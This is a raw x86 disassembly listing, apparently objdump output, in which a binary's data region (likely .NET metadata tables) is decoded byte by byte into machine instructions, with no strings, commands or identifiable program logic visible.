  40586b:	18 11                	sbb    %dl,(%ecx)
  40586d:	0c 06                	or     $0x6,%al
  40586f:	00 21                	add    %ah,(%ecx)
  405871:	18 42 03             	sbb    %al,0x3(%edx)
  405874:	06                   	push   %es
  405875:	00 3e                	add    %bh,(%esi)
  405877:	18 42 03             	sbb    %al,0x3(%edx)
  40587a:	06                   	push   %es
  40587b:	00 ba 18 63 01 06    	add    %bh,0x6016318(%edx)
  405881:	00 04 19             	add    %al,(%ecx,%ebx,1)
  405884:	11 0c 1a             	adc    %ecx,(%edx,%ebx,1)
  405887:	00 21                	add    %ah,(%ecx)
  405889:	19 02                	sbb    %eax,(%edx)
  40588b:	13 06                	adc    (%esi),%eax
  40588d:	00 32                	add    %dh,(%edx)
  40588f:	19 63 01             	sbb    %esp,0x1(%ebx)
  405892:	06                   	push   %es
  405893:	00 73 19             	add    %dh,0x19(%ebx)
  405896:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  405899:	00 9d 19 80 19 06    	add    %bl,0x6198019(%ebp)
  40589f:	00 ad 19 80 19 06    	add    %ch,0x6198019(%ebp)
  4058a5:	00 be 19 80 19 06    	add    %bh,0x6198019(%esi)
  4058ab:	00 d7                	add    %dl,%bh
  4058ad:	19 80 19 06 00 f1    	sbb    %eax,-0xefff9e7(%eax)
  4058b3:	19 63 01             	sbb    %esp,0x1(%ebx)
  4058b6:	06                   	push   %es
  4058b7:	00 fc                	add    %bh,%ah
  4058b9:	19 80 19 06 00 17    	sbb    %eax,0x17000619(%eax)
  4058bf:	1a 80 19 0e 00 4f    	sbb    0x4f000e19(%eax),%al
  4058c5:	1a c7                	sbb    %bh,%al
  4058c7:	0a 0e                	or     (%esi),%cl
  4058c9:	00 79 1a             	add    %bh,0x1a(%ecx)
  4058cc:	63 01                	arpl   %eax,(%ecx)
  4058ce:	0e                   	push   %cs
  4058cf:	00 7d 1a             	add    %bh,0x1a(%ebp)
  4058d2:	63 01                	arpl   %eax,(%ecx)
  4058d4:	06                   	push   %es
  4058d5:	00 f7                	add    %dh,%bh
  4058d7:	1a 42 03             	sbb    0x3(%edx),%al
  4058da:	06                   	push   %es
  4058db:	00 0f                	add    %cl,(%edi)
  4058dd:	1b 63 01             	sbb    0x1(%ebx),%esp
  4058e0:	06                   	push   %es
  4058e1:	00 27                	add    %ah,(%edi)
  4058e3:	1b 13                	sbb    (%ebx),%edx
  4058e5:	14 06                	adc    $0x6,%al
  4058e7:	00 3c 1b             	add    %bh,(%ebx,%ebx,1)
  4058ea:	13 14 06             	adc    (%esi,%eax,1),%edx
  4058ed:	00 64 1b 13          	add    %ah,0x13(%ebx,%ebx,1)
  4058f1:	14 06                	adc    $0x6,%al
  4058f3:	00 81 1b 63 01 0e    	add    %al,0xe01631b(%ecx)
  4058f9:	00 a4 1b 8e 1b 0e 00 	add    %ah,0xe1b8e(%ebx,%ebx,1)
  405900:	af                   	scas   %es:(%edi),%eax
  405901:	1b 8e 1b 06 00 e9    	sbb    -0x16fff9e5(%esi),%ecx
  405907:	1b 11                	sbb    (%ecx),%edx
  405909:	0c 06                	or     $0x6,%al
  40590b:	00 ff                	add    %bh,%bh
  40590d:	1b 11                	sbb    (%ecx),%edx
  40590f:	0c 06                	or     $0x6,%al
  405911:	00 0a                	add    %cl,(%edx)
  405913:	1c 7b                	sbb    $0x7b,%al
  405915:	0b 06                	or     (%esi),%eax
  405917:	00 2a                	add    %ch,(%edx)
  405919:	1c 7b                	sbb    $0x7b,%al
  40591b:	0b 06                	or     (%esi),%eax
  40591d:	00 48 1c             	add    %cl,0x1c(%eax)
  405920:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  405923:	00 56 1c             	add    %dl,0x1c(%esi)
  405926:	1a 15 06 00 73 1c    	sbb    0x1c730006,%dl
  40592c:	1a 15 06 00 8e 1c    	sbb    0x1c8e0006,%dl
  405932:	1a 15 06 00 a9 1c    	sbb    0x1ca90006,%dl
  405938:	1a 15 06 00 c2 1c    	sbb    0x1cc20006,%dl
  40593e:	1a 15 06 00 db 1c    	sbb    0x1cdb0006,%dl
  405944:	1a 15 06 00 f8 1c    	sbb    0x1cf80006,%dl
  40594a:	1a 15 00 00 00 00    	sbb    0x0,%dl
  405950:	01 00                	add    %eax,(%eax)
  405952:	00 00                	add    %al,(%eax)
  405954:	00 00                	add    %al,(%eax)
  405956:	01 00                	add    %eax,(%eax)
  405958:	01 00                	add    %eax,(%eax)
  40595a:	00 00                	add    %al,(%eax)
  40595c:	00 00                	add    %al,(%eax)
  40595e:	29 00                	sub    %eax,(%eax)
  405960:	37                   	aaa
  405961:	00 05 00 01 00 01    	add    %al,0x1000100
  405967:	00 00                	add    %al,(%eax)
  405969:	00 00                	add    %al,(%eax)
  40596b:	00 3a                	add    %bh,(%edx)
  40596d:	00 37                	add    %dh,(%edi)
  40596f:	00 09                	add    %cl,(%ecx)
  405971:	00 01                	add    %al,(%ecx)
  405973:	00 02                	add    %al,(%edx)
  405975:	00 00                	add    %al,(%eax)
  405977:	01 10                	add    %edx,(%eax)
  405979:	00 45 00             	add    %al,0x0(%ebp)
  40597c:	37                   	aaa
  40597d:	00 0d 00 01 00 03    	add    %cl,0x3000100
  405983:	00 05 01 00 00 4f    	add    %al,0x4f000001
  405989:	00 00                	add    %al,(%eax)
  40598b:	00 0d 00 05 00 08    	add    %cl,0x8000500
  405991:	00 05 01 00 00 5d    	add    %al,0x5d000001
  405997:	00 00                	add    %al,(%eax)
  405999:	00 0d 00 05 00 0f    	add    %cl,0xf000500
  40599f:	00 01                	add    %al,(%ecx)
  4059a1:	00 10                	add    %dl,(%eax)
  4059a3:	00 78 00             	add    %bh,0x0(%eax)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0d 00 06 00 11       	or     $0x11000600,%eax
  4059ad:	00 01                	add    %al,(%ecx)
  4059af:	00 00                	add    %al,(%eax)
  4059b1:	00 81 00 86 00 0d    	add    %al,0xd008600(%ecx)
  4059b7:	00 10                	add    %dl,(%eax)
  4059b9:	00 13                	add    %dl,(%ebx)
  4059bb:	00 01                	add    %al,(%ecx)
  4059bd:	00 10                	add    %dl,(%eax)
  4059bf:	00 8b 00 86 00 0d    	add    %cl,0xd008600(%ebx)
  4059c5:	00 10                	add    %dl,(%eax)
  4059c7:	00 19                	add    %bl,(%ecx)
  4059c9:	00 01                	add    %al,(%ecx)
  4059cb:	00 00                	add    %al,(%eax)
  4059cd:	00 98 00 86 00 0d    	add    %bl,0xd008600(%eax)
  4059d3:	00 1b                	add    %bl,(%ebx)
  4059d5:	00 2e                	add    %ch,(%esi)
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	00 00                	add    %al,(%eax)
  4059db:	00 a1 00 86 00 0d    	add    %ah,0xd008600(%ecx)
  4059e1:	00 20                	add    %ah,(%eax)
  4059e3:	00 3d 00 01 00 10    	add    %bh,0x10000100
  4059e9:	00 ad 00 86 00 0d    	add    %ch,0xd008600(%ebp)
  4059ef:	00 20                	add    %ah,(%eax)
  4059f1:	00 3f                	add    %bh,(%edi)
  4059f3:	00 01                	add    %al,(%ecx)
  4059f5:	00 00                	add    %al,(%eax)
  4059f7:	00 b5 00 86 00 0d    	add    %dh,0xd008600(%ebp)
  4059fd:	00 25 00 51 00 00    	add    %ah,0x5100
  405a03:	01 10                	add    %edx,(%eax)
  405a05:	00 c2                	add    %al,%dl
  405a07:	00 86 00 0d 00 25    	add    %al,0x25000d00(%esi)
  405a0d:	00 53 00             	add    %dl,0x0(%ebx)
  405a10:	03 01                	add    (%ecx),%eax
  405a12:	00 00                	add    %al,(%eax)
  405a14:	c9                   	leave
  405a15:	00 00                	add    %al,(%eax)
  405a17:	00 41 00             	add    %al,0x0(%ecx)
  405a1a:	31 00                	xor    %eax,(%eax)
  405a1c:	6b 00 0a             	imul   $0xa,(%eax),%eax
  405a1f:	01 00                	add    %eax,(%eax)
  405a21:	00 de                	add    %bl,%dh
  405a23:	00 00                	add    %al,(%eax)
  405a25:	00 49 00             	add    %cl,0x0(%ecx)
  405a28:	31 00                	xor    %eax,(%eax)
  405a2a:	6f                   	outsl  %ds:(%esi),(%dx)
  405a2b:	00 02                	add    %al,(%edx)
  405a2d:	01 00                	add    %eax,(%eax)
  405a2f:	00 ec                	add    %ch,%ah
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 4d 00             	add    %cl,0x0(%ebp)
  405a36:	33 00                	xor    (%eax),%eax
  405a38:	6f                   	outsl  %ds:(%esi),(%dx)
  405a39:	00 00                	add    %al,(%eax)
  405a3b:	01 00                	add    %eax,(%eax)
  405a3d:	00 97 0c 00 00 41    	add    %dl,0x4100000c(%edi)
  405a43:	00 37                	add    %dh,(%edi)
  405a45:	00 6f 00             	add    %ch,0x0(%edi)
  405a48:	05 00 00 00 6f       	add    $0x6f000000,%eax
  405a4d:	12 00                	adc    (%eax),%al
  405a4f:	00 0d 00 37 00 73    	add    %cl,0x73003700
  405a55:	00 31                	add    %dh,(%ecx)
  405a57:	00 85 01 20 00 31    	add    %al,0x31002001(%ebp)
  405a5d:	00 ae 01 2d 00 31    	add    %ch,0x31002d01(%esi)
  405a63:	00 d0                	add    %dl,%al
  405a65:	01 3a                	add    %edi,(%edx)
  405a67:	00 31                	add    %dh,(%ecx)
  405a69:	00 f5                	add    %dh,%ch
  405a6b:	01 47 00             	add    %eax,0x0(%edi)
  405a6e:	11 00                	adc    %eax,(%eax)
  405a70:	98                   	cwtl
  405a71:	02 90 00 16 00 b8    	add    -0x47ffea00(%eax),%dl
  405a77:	02 99 00 16 00 c1    	add    -0x3effea00(%ecx),%bl
  405a7d:	02 99 00 16 00 c6    	add    -0x39ffea00(%ecx),%bl
  405a83:	02 99 00 16 00 cb    	add    -0x34ffea00(%ecx),%bl
  405a89:	02 99 00 16 00 cf    	add    -0x30ffea00(%ecx),%bl
  405a8f:	02 99 00 16 00 d3    	add    -0x2cffea00(%ecx),%bl
  405a95:	02 9c 00 16 00 d9 02 	add    0x2d90016(%eax,%eax,1),%bl
  405a9c:	99                   	cltd
  405a9d:	00 16                	add    %dl,(%esi)
  405a9f:	00 df                	add    %bl,%bh
  405aa1:	02 99 00 16 00 e5    	add    -0x1affea00(%ecx),%bl
  405aa7:	02 99 00 16 00 eb    	add    -0x14ffea00(%ecx),%bl
  405aad:	02 99 00 16 00 06    	add    0x6001600(%ecx),%bl
  405ab3:	03 a4 00 16 00 2c 03 	add    0x32c0016(%eax,%eax,1),%esp
  405aba:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405abb:	00 11                	add    %dl,(%ecx)
  405abd:	00 2e                	add    %ch,(%esi)
  405abf:	03 ab 00 11 00 3b    	add    0x3b001100(%ebx),%ebp
  405ac5:	03 ae 00 11 00 59    	add    0x59001100(%esi),%ebp
  405acb:	03 b2 00 11 00 73    	add    0x73001100(%edx),%esi
  405ad1:	03 b6 00 16 00 89    	add    -0x76ffea00(%esi),%esi
  405ad7:	03 ba 00 11 00 91    	add    -0x6effef00(%edx),%edi
  405add:	03 be 00 16 00 9a    	add    -0x65ffea00(%esi),%edi
  405ae3:	03 b6 00 16 00 a0    	add    -0x5fffea00(%esi),%esi
  405ae9:	03 9c 00 16 00 a9 03 	add    0x3a90016(%eax,%eax,1),%ebx
  405af0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405af1:	00 16                	add    %dl,(%esi)
  405af3:	00 57 04             	add    %dl,0x4(%edi)
  405af6:	e4 00                	in     $0x0,%al
  405af8:	16                   	push   %ss
  405af9:	00 61 04             	add    %ah,0x4(%ecx)
  405afc:	9c                   	pushf
  405afd:	00 16                	add    %dl,(%esi)
  405aff:	00 86 04 e8 00 16    	add    %al,0x1600e804(%esi)
  405b05:	00 8b 04 e8 00 16    	add    %cl,0x1600e804(%ebx)
  405b0b:	00 15 05 fe 00 11    	add    %dl,0x1100fe05
  405b11:	00 90 05 99 00 51    	add    %dl,0x51009905(%eax)
  405b17:	80 08 06             	orb    $0x6,(%eax)
  405b1a:	9c                   	pushf
  405b1b:	00 11                	add    %dl,(%ecx)
  405b1d:	00 13                	add    %dl,(%ebx)
  405b1f:	06                   	push   %es
  405b20:	3c 01                	cmp    $0x1,%al
  405b22:	11 00                	adc    %eax,(%eax)
  405b24:	19 06                	sbb    %eax,(%esi)
  405b26:	fe 00                	incb   (%eax)
  405b28:	11 00                	adc    %eax,(%eax)
  405b2a:	92                   	xchg   %eax,%edx
  405b2b:	06                   	push   %es
  405b2c:	9c                   	pushf
  405b2d:	00 16                	add    %dl,(%esi)
  405b2f:	00 ac 07 a4 00 51 80 	add    %ch,-0x7faeff5c(%edi,%eax,1)
  405b36:	ef                   	out    %eax,(%dx)
  405b37:	07                   	pop    %es
  405b38:	99                   	cltd
  405b39:	00 16                	add    %dl,(%esi)
  405b3b:	00 f8                	add    %bh,%al
  405b3d:	07                   	pop    %es
  405b3e:	c8 01 36 00          	enter  $0x3601,$0x0
  405b42:	ff 07                	incl   (%edi)
  405b44:	99                   	cltd
  405b45:	00 16                	add    %dl,(%esi)
  405b47:	00 02                	add    %al,(%edx)
  405b49:	08 99 00 11 00 37    	or     %bl,0x37001100(%ecx)
  405b4f:	08 9c 00 11 00 40 08 	or     %bl,0x8400011(%eax,%eax,1)
  405b56:	d8 01                	fadds  (%ecx)
  405b58:	16                   	push   %ss
  405b59:	00 67 08             	add    %ah,0x8(%edi)
  405b5c:	e0 01                	loopne 0x405b5f
  405b5e:	16                   	push   %ss
  405b5f:	00 75 08             	add    %dh,0x8(%ebp)
  405b62:	9c                   	pushf
  405b63:	00 16                	add    %dl,(%esi)
  405b65:	00 86 08 99 00 16    	add    %al,0x16009908(%esi)
  405b6b:	00 93 08 e4 00 16    	add    %dl,0x1600e408(%ebx)
  405b71:	00 4a 09             	add    %cl,0x9(%edx)
  405b74:	0d 02 06 10 04       	or     $0x4100602,%eax
  405b79:	0a 9c 00 06 10 0b 0a 	or     0xa0b1006(%eax,%eax,1),%bl
  405b80:	9c                   	pushf
  405b81:	00 06                	add    %al,(%esi)
  405b83:	06                   	push   %es
  405b84:	17                   	pop    %ss
  405b85:	0a 2f                	or     (%edi),%ch
  405b87:	02 56 80             	add    -0x80(%esi),%dl
  405b8a:	1f                   	pop    %ds
  405b8b:	0a 32                	or     (%edx),%dh
  405b8d:	02 56 80             	add    -0x80(%esi),%dl
  405b90:	2d 0a 32 02 56       	sub    $0x5602320a,%eax
  405b95:	80 41 0a 32          	addb   $0x32,0xa(%ecx)
  405b99:	02 06                	add    (%esi),%al
  405b9b:	00 7c 12 99          	add    %bh,-0x67(%edx,%edx,1)
  405b9f:	00 06                	add    %al,(%esi)
  405ba1:	00 8b 12 99 00 50    	add    %cl,0x50009912(%ebx)
  405ba7:	20 00                	and    %al,(%eax)
  405ba9:	00 00                	add    %al,(%eax)
  405bab:	00 06                	add    %al,(%esi)
  405bad:	18 36                	sbb    %dh,(%esi)
  405baf:	01 13                	add    %edx,(%ebx)
  405bb1:	00 01                	add    %al,(%ecx)
  405bb3:	00 58 20             	add    %bl,0x20(%eax)
  405bb6:	00 00                	add    %al,(%eax)
  405bb8:	00 00                	add    %al,(%eax)
  405bba:	06                   	push   %es
  405bbb:	18 36                	sbb    %dh,(%esi)
  405bbd:	01 13                	add    %edx,(%ebx)
  405bbf:	00 01                	add    %al,(%ecx)
  405bc1:	00 60 20             	add    %ah,0x20(%eax)
  405bc4:	00 00                	add    %al,(%eax)
  405bc6:	00 00                	add    %al,(%eax)
  405bc8:	11 18                	adc    %ebx,(%eax)
  405bca:	71 01                	jno    0x405bcd
  405bcc:	17                   	pop    %ss
  405bcd:	00 01                	add    %al,(%ecx)
  405bcf:	00 8c 20 00 00 00 00 	add    %cl,0x0(%eax,%eiz,1)
  405bd6:	13 08                	adc    (%eax),%ecx
  405bd8:	78 01                	js     0x405bdb
  405bda:	1b 00                	sbb    (%eax),%eax
  405bdc:	01 00                	add    %eax,(%eax)
  405bde:	a8 20                	test   $0x20,%al
  405be0:	00 00                	add    %al,(%eax)
  405be2:	00 00                	add    %al,(%eax)
  405be4:	13 08                	adc    (%eax),%ecx
  405be6:	9e                   	sahf
  405be7:	01 28                	add    %ebp,(%eax)
  405be9:	00 01                	add    %al,(%ecx)
  405beb:	00 c4                	add    %al,%ah
  405bed:	20 00                	and    %al,(%eax)
  405bef:	00 00                	add    %al,(%eax)
  405bf1:	00 13                	add    %dl,(%ebx)
  405bf3:	08 c7                	or     %al,%bh
  405bf5:	01 35 00 01 00 e0    	add    %esi,0xe0000100
  405bfb:	20 00                	and    %al,(%eax)
  405bfd:	00 00                	add    %al,(%eax)
  405bff:	00 13                	add    %dl,(%ebx)
  405c01:	08 e5                	or     %ah,%ch
  405c03:	01 42 00             	add    %eax,0x0(%edx)
  405c06:	01 00                	add    %eax,(%eax)
  405c08:	fc                   	cld
  405c09:	20 00                	and    %al,(%eax)
  405c0b:	00 00                	add    %al,(%eax)
  405c0d:	00 46 02             	add    %al,0x2(%esi)
  405c10:	2b 02                	sub    (%edx),%eax
  405c12:	63 00                	arpl   %eax,(%eax)
  405c14:	01 00                	add    %eax,(%eax)
  405c16:	1c 21                	sbb    $0x21,%al
  405c18:	00 00                	add    %al,(%eax)
  405c1a:	00 00                	add    %al,(%eax)
  405c1c:	46                   	inc    %esi
  405c1d:	02 34 02             	add    (%edx,%eax,1),%dh
  405c20:	68 00 02 00 34       	push   $0x34000200
  405c25:	21 00                	and    %eax,(%eax)
  405c27:	00 00                	add    %al,(%eax)
  405c29:	00 83 00 45 02 6c    	add    %al,0x6c024500(%ebx)
  405c2f:	00 02                	add    %al,(%edx)
  405c31:	00 50 21             	add    %dl,0x21(%eax)
  405c34:	00 00                	add    %al,(%eax)
  405c36:	00 00                	add    %al,(%eax)
  405c38:	46                   	inc    %esi
  405c39:	02 4d 02             	add    0x2(%ebp),%cl
  405c3c:	71 00                	jno    0x405c3e
  405c3e:	02 00                	add    (%eax),%al
  405c40:	68 21 00 00 00       	push   $0x21
  405c45:	00 11                	add    %dl,(%ecx)
  405c47:	00 56 02             	add    %dl,0x2(%esi)
  405c4a:	78 00                	js     0x405c4c
  405c4c:	02 00                	add    (%eax),%al
  405c4e:	8c 21                	mov    %fs,(%ecx)
  405c50:	00 00                	add    %al,(%eax)
  405c52:	00 00                	add    %al,(%eax)
  405c54:	01 00                	add    %eax,(%eax)
  405c56:	74 02                	je     0x405c5a
  405c58:	80 00 03             	addb   $0x3,(%eax)
  405c5b:	00 a8 21 00 00 00    	add    %ch,0x21(%eax)
  405c61:	00 06                	add    %al,(%esi)
  405c63:	18 36                	sbb    %dh,(%esi)
  405c65:	01 13                	add    %edx,(%ebx)
  405c67:	00 04 00             	add    %al,(%eax,%eax,1)
  405c6a:	b0 21                	mov    $0x21,%al
  405c6c:	00 00                	add    %al,(%eax)
  405c6e:	00 00                	add    %al,(%eax)
  405c70:	03 08                	add    (%eax),%ecx
  405c72:	88 02                	mov    %al,(%edx)
  405c74:	8b 00                	mov    (%eax),%eax
  405c76:	04 00                	add    $0x0,%al
  405c78:	dc 21                	fsubl  (%ecx)
  405c7a:	00 00                	add    %al,(%eax)
  405c7c:	00 00                	add    %al,(%eax)
  405c7e:	06                   	push   %es
  405c7f:	18 36                	sbb    %dh,(%esi)
  405c81:	01 13                	add    %edx,(%ebx)
  405c83:	00 04 00             	add    %al,(%eax,%eax,1)
  405c86:	e4 21                	in     $0x21,%al
  405c88:	00 00                	add    %al,(%eax)
  405c8a:	00 00                	add    %al,(%eax)
  405c8c:	11 18                	adc    %ebx,(%eax)
  405c8e:	71 01                	jno    0x405c91
  405c90:	17                   	pop    %ss
  405c91:	00 04 00             	add    %al,(%eax,%eax,1)
  405c94:	4c                   	dec    %esp
  405c95:	22 00                	and    (%eax),%al
  405c97:	00 00                	add    %al,(%eax)
  405c99:	00 06                	add    %al,(%esi)
  405c9b:	18 36                	sbb    %dh,(%esi)
  405c9d:	01 13                	add    %edx,(%ebx)
  405c9f:	00 04 00             	add    %al,(%eax,%eax,1)
  405ca2:	54                   	push   %esp
  405ca3:	22 00                	and    (%eax),%al
  405ca5:	00 00                	add    %al,(%eax)
  405ca7:	00 06                	add    %al,(%esi)
  405ca9:	18 36                	sbb    %dh,(%esi)
  405cab:	01 13                	add    %edx,(%ebx)
  405cad:	00 04 00             	add    %al,(%eax,%eax,1)
  405cb0:	5c                   	pop    %esp
  405cb1:	22 00                	and    (%eax),%al
  405cb3:	00 00                	add    %al,(%eax)
  405cb5:	00 16                	add    %dl,(%esi)
  405cb7:	00 81 00 17 00 04    	add    %al,0x4001700(%ecx)
  405cbd:	00 a8 23 00 00 00    	add    %ch,0x23(%eax)
  405cc3:	00 16                	add    %dl,(%esi)
  405cc5:	00 f6                	add    %dh,%dh
  405cc7:	02 9f 00 04 00 48    	add    0x48000400(%edi),%bl
  405ccd:	24 00                	and    $0x0,%al
  405ccf:	00 00                	add    %al,(%eax)
  405cd1:	00 11                	add    %dl,(%ecx)
  405cd3:	08 ae 0c 17 00 05    	or     %ch,0x500170c(%esi)
  405cd9:	00 54 24 00          	add    %dl,0x0(%esp)
  405cdd:	00 00                	add    %al,(%eax)
  405cdf:	00 11                	add    %dl,(%ecx)
  405ce1:	08 ba 0c 17 00 05    	or     %bh,0x500170c(%edx)
  405ce7:	00 60 24             	add    %ah,0x24(%eax)
  405cea:	00 00                	add    %al,(%eax)
  405cec:	00 00                	add    %al,(%eax)
  405cee:	11 08                	adc    %ecx,(%eax)
  405cf0:	c6                   	(bad)
  405cf1:	0c 17                	or     $0x17,%al
  405cf3:	00 05 00 9c 24 00    	add    %al,0x249c00
  405cf9:	00 00                	add    %al,(%eax)
  405cfb:	00 11                	add    %dl,(%ecx)
  405cfd:	18 71 01             	sbb    %dh,0x1(%ecx)
  405d00:	17                   	pop    %ss
  405d01:	00 05 00 d0 24 00    	add    %al,0x24d000
  405d07:	00 00                	add    %al,(%eax)
  405d09:	00 06                	add    %al,(%esi)
  405d0b:	18 36                	sbb    %dh,(%esi)
  405d0d:	01 13                	add    %edx,(%ebx)
  405d0f:	00 05 00 d8 24 00    	add    %al,0x24d800
  405d15:	00 00                	add    %al,(%eax)
  405d17:	00 16                	add    %dl,(%esi)
  405d19:	00 b6 03 17 00 05    	add    %dh,0x5001703(%esi)
  405d1f:	00 e8                	add    %ch,%al
  405d21:	24 00                	and    $0x0,%al
  405d23:	00 00                	add    %al,(%eax)
  405d25:	00 16                	add    %dl,(%esi)
  405d27:	00 c3                	add    %al,%bl
  405d29:	03 c1                	add    %ecx,%eax
  405d2b:	00 05 00 58 26 00    	add    %al,0x265800
  405d31:	00 00                	add    %al,(%eax)
  405d33:	00 16                	add    %dl,(%esi)
  405d35:	00 d3                	add    %dl,%bl
  405d37:	03 c6                	add    %esi,%eax
  405d39:	00 06                	add    %al,(%esi)
  405d3b:	00 bc 27 00 00 00 00 	add    %bh,0x0(%edi,%eiz,1)
  405d42:	16                   	push   %ss
  405d43:	00 d8                	add    %bl,%al
  405d45:	03 ca                	add    %edx,%ecx
  405d47:	00 06                	add    %al,(%esi)
  405d49:	00 18                	add    %bl,(%eax)
  405d4b:	28 00                	sub    %al,(%eax)
  405d4d:	00 00                	add    %al,(%eax)
  405d4f:	00 16                	add    %dl,(%esi)
  405d51:	00 df                	add    %bl,%bh
  405d53:	03 ca                	add    %edx,%ecx
  405d55:	00 06                	add    %al,(%esi)
  405d57:	00 80 28 00 00 00    	add    %al,0x28(%eax)
  405d5d:	00 16                	add    %dl,(%esi)
  405d5f:	00 e6                	add    %ah,%dh
  405d61:	03 ca                	add    %edx,%ecx
  405d63:	00 06                	add    %al,(%esi)
  405d65:	00 dc                	add    %bl,%ah
  405d67:	28 00                	sub    %al,(%eax)
  405d69:	00 00                	add    %al,(%eax)
  405d6b:	00 16                	add    %dl,(%esi)
  405d6d:	00 ea                	add    %ch,%dl
  405d6f:	03 ca                	add    %edx,%ecx
  405d71:	00 06                	add    %al,(%esi)
  405d73:	00 e0                	add    %ah,%al
  405d75:	29 00                	sub    %eax,(%eax)
  405d77:	00 00                	add    %al,(%eax)
  405d79:	00 16                	add    %dl,(%esi)
  405d7b:	00 f4                	add    %dh,%ah
  405d7d:	03 ca                	add    %edx,%ecx
  405d7f:	00 06                	add    %al,(%esi)
  405d81:	00 98 2a 00 00 00    	add    %bl,0x2a(%eax)
  405d87:	00 16                	add    %dl,(%esi)
  405d89:	00 f8                	add    %bh,%al
  405d8b:	03 ca                	add    %edx,%ecx
  405d8d:	00 06                	add    %al,(%esi)
  405d8f:	00 38                	add    %bh,(%eax)
  405d91:	2b 00                	sub    (%eax),%eax
  405d93:	00 00                	add    %al,(%eax)
  405d95:	00 16                	add    %dl,(%esi)
  405d97:	00 fc                	add    %bh,%ah
  405d99:	03 ca                	add    %edx,%ecx
  405d9b:	00 06                	add    %al,(%esi)
  405d9d:	00 10                	add    %dl,(%eax)
  405d9f:	2c 00                	sub    $0x0,%al
  405da1:	00 00                	add    %al,(%eax)
  405da3:	00 16                	add    %dl,(%esi)
  405da5:	00 0d 04 ce 00 06    	add    %cl,0x600ce04
  405dab:	00 00                	add    %al,(%eax)
  405dad:	2e 00 00             	add    %al,%cs:(%eax)
  405db0:	00 00                	add    %al,(%eax)
  405db2:	16                   	push   %ss
  405db3:	00 1d 04 d4 00 07    	add    %bl,0x700d404
  405db9:	00 34 2e             	add    %dh,(%esi,%ebp,1)
  405dbc:	00 00                	add    %al,(%eax)
  405dbe:	00 00                	add    %al,(%eax)
  405dc0:	16                   	push   %ss
  405dc1:	00 29                	add    %ch,(%ecx)
  405dc3:	04 da                	add    $0xda,%al
  405dc5:	00 08                	add    %cl,(%eax)
  405dc7:	00 34 2f             	add    %dh,(%edi,%ebp,1)
  405dca:	00 00                	add    %al,(%eax)
  405dcc:	00 00                	add    %al,(%eax)
  405dce:	16                   	push   %ss
  405dcf:	00 32                	add    %dh,(%edx)
  405dd1:	04 ce                	add    $0xce,%al
  405dd3:	00 09                	add    %cl,(%ecx)
  405dd5:	00 74 2f 00          	add    %dh,0x0(%edi,%ebp,1)
  405dd9:	00 00                	add    %al,(%eax)
  405ddb:	00 16                	add    %dl,(%esi)
  405ddd:	00 3a                	add    %bh,(%edx)
  405ddf:	04 17                	add    $0x17,%al
  405de1:	00 0a                	add    %cl,(%edx)
  405de3:	00 6c 30 00          	add    %ch,0x0(%eax,%esi,1)
  405de7:	00 00                	add    %al,(%eax)
  405de9:	00 16                	add    %dl,(%esi)
  405deb:	00 49 04             	add    %cl,0x4(%ecx)
  405dee:	df 00                	filds  (%eax)
  405df0:	0a 00                	or     (%eax),%al
  405df2:	b4 30                	mov    $0x30,%ah
  405df4:	00 00                	add    %al,(%eax)
  405df6:	00 00                	add    %al,(%eax)
  405df8:	16                   	push   %ss
  405df9:	00 52 04             	add    %dl,0x4(%edx)
  405dfc:	17                   	pop    %ss
  405dfd:	00 0b                	add    %cl,(%ebx)
  405dff:	00 30                	add    %dh,(%eax)
  405e01:	31 00                	xor    %eax,(%eax)
  405e03:	00 00                	add    %al,(%eax)
  405e05:	00 11                	add    %dl,(%ecx)
  405e07:	08 51 0e             	or     %dl,0xe(%ecx)
  405e0a:	df 00                	filds  (%eax)
  405e0c:	0b 00                	or     (%eax),%eax
  405e0e:	3c 31                	cmp    $0x31,%al
  405e10:	00 00                	add    %al,(%eax)
  405e12:	00 00                	add    %al,(%eax)
  405e14:	11 08                	adc    %ecx,(%eax)
  405e16:	60                   	pusha
  405e17:	0e                   	push   %cs
  405e18:	df 00                	filds  (%eax)
  405e1a:	0c 00                	or     $0x0,%al
  405e1c:	4c                   	dec    %esp
  405e1d:	31 00                	xor    %eax,(%eax)
  405e1f:	00 00                	add    %al,(%eax)
  405e21:	00 06                	add    %al,(%esi)
  405e23:	18 36                	sbb    %dh,(%esi)
  405e25:	01 13                	add    %edx,(%ebx)
  405e27:	00 0d 00 54 31 00    	add    %cl,0x315400
  405e2d:	00 00                	add    %al,(%eax)
  405e2f:	00 16                	add    %dl,(%esi)
  405e31:	00 5c 04 d4          	add    %bl,-0x2c(%esp,%eax,1)
  405e35:	00 0d 00 1c 3a 00    	add    %cl,0x3a1c00
  405e3b:	00 00                	add    %al,(%eax)
  405e3d:	00 16                	add    %dl,(%esi)
  405e3f:	00 64 04 d4          	add    %ah,-0x2c(%esp,%eax,1)
  405e43:	00 0e                	add    %cl,(%esi)
  405e45:	00 f8                	add    %bh,%al
  405e47:	3e 00 00             	add    %al,%ds:(%eax)
  405e4a:	00 00                	add    %al,(%eax)
  405e4c:	16                   	push   %ss
  405e4d:	00 6d 04             	add    %ch,0x4(%ebp)
  405e50:	da 00                	fiaddl (%eax)
  405e52:	0f 00                	(bad)
  405e54:	3c 3f                	cmp    $0x3f,%al
  405e56:	00 00                	add    %al,(%eax)
  405e58:	00 00                	add    %al,(%eax)
  405e5a:	16                   	push   %ss
  405e5b:	00 75 04             	add    %dh,0x4(%ebp)
  405e5e:	da 00                	fiaddl (%eax)
  405e60:	10 00                	adc    %al,(%eax)
  405e62:	80 3f 00             	cmpb   $0x0,(%edi)
  405e65:	00 00                	add    %al,(%eax)
  405e67:	00 16                	add    %dl,(%esi)
  405e69:	00 98 04 da 00 11    	add    %bl,0x1100da04(%eax)
  405e6f:	00 70 40             	add    %dh,0x40(%eax)
  405e72:	00 00                	add    %al,(%eax)
  405e74:	00 00                	add    %al,(%eax)
  405e76:	16                   	push   %ss
  405e77:	00 a1 04 da 00 12    	add    %ah,0x1200da04(%ecx)
  405e7d:	00 60 41             	add    %ah,0x41(%eax)
  405e80:	00 00                	add    %al,(%eax)
  405e82:	00 00                	add    %al,(%eax)
  405e84:	16                   	push   %ss
